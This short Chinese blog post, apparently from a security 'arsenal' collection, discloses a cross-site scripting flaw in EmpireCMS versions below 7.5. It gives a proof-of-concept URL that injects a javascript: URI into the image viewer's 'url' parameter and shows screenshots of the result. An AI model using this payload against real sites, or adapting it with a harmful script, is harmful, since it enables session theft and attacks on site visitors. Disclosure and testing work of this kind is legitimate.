---
title: 'EmpireCMS 全版本XSS漏洞'
date: Sat, 05 Sep 2020 13:16:35 +0000
draft: false
tags: ['白阁-武器库']
---

### 漏洞范围

EmpireCMS 全版本 <7.5

### 漏洞POC

```
http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)
```

![](https://www.bylibrary.cn/wp-content/uploads/2020/09/K52GS8VKPFJ7RHL7J1.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/PWG@XY7ATDZ@YR.png)